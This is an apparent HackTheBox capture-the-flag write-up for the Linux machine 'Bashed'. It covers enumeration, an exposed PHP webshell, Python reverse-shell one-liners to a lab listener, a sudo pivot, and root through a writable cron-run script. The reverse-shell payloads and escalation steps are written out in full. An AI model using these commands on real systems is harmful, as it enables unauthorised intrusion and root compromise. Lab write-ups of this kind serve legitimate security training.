# Bashed

**Platform:** HackTheBox  
**OS:** Linux  
**Difficulty:** Easy  
**Date:** April 2026

---

## Summary

Linux machine running a web server with a PHP webshell accessible 
via a hidden directory. Initial access obtained through the webshell 
and upgraded to a reverse shell. Privilege escalation achieved in 
two steps: first via sudo permissions to scriptmanager, then via 
a cronjob running a writable Python script as root.

---

## 1. Reconnaissance

Port scan using nmap:

```bash
nmap -Pn -sCV --top-ports 1000 -T3 10.129.19.210
```

**Open ports:**

| Port | Service |
|------|---------|
| 80 | HTTP Apache |

---

## 2. Web Enumeration

Ran Gobuster to find hidden directories:

```bash
gobuster dir -u http://10.129.19.210 \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php,html,txt
```

Found PHP webshell at:
http://10.129.19.210/dev/phpbash.php

Accessed as **www-data**.

---

## 3. Reverse Shell

Started listener:

```bash
nc -lvnp 4444
```

Executed reverse shell from webshell:

```python
python3 -c 'import socket,subprocess,os;s=socket.socket();
s.connect(("10.10.15.207",4444));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
subprocess.call(["/bin/sh","-i"])'
```

Received shell as **www-data**.

---

## 4. Privilege Escalation — Stage 1

Checked sudo permissions:

```bash
sudo -l
```

www-data can run any command as scriptmanager without password.

Switched to scriptmanager:

```bash
sudo -u scriptmanager /bin/bash -i
```

---

## 5. Privilege Escalation — Stage 2

Found writable Python script in /scripts:

```bash
ls -la /scripts
```

Noticed test.txt owned by root with recent timestamp, indicating 
a cronjob runs test.py as root every minute.

Started new listener:

```bash
nc -lvnp 9999
```

Overwrote test.py with reverse shell:

```bash
echo 'import socket,subprocess,os;s=socket.socket();
s.connect(("10.10.15.207",9999));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
subprocess.call(["/bin/sh","-i"])' > /scripts/test.py
```

Waited for cronjob to execute. Received shell as **root**.

---

## 6. Flags

```bash
cat /home/arrexel/user.txt
cat /root/root.txt
```

- user.txt ✅
- root.txt ✅

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port and service enumeration |
| Gobuster | Directory enumeration |
| netcat | Reverse shell listener |

---

## Vulnerabilities Found

| Vulnerability | Description |
|--------------|-------------|
| Exposed Webshell | phpbash accessible via hidden directory |
| sudo Misconfiguration | www-data can run commands as scriptmanager |
| Writable Cronjob Script | test.py executed as root every minute |
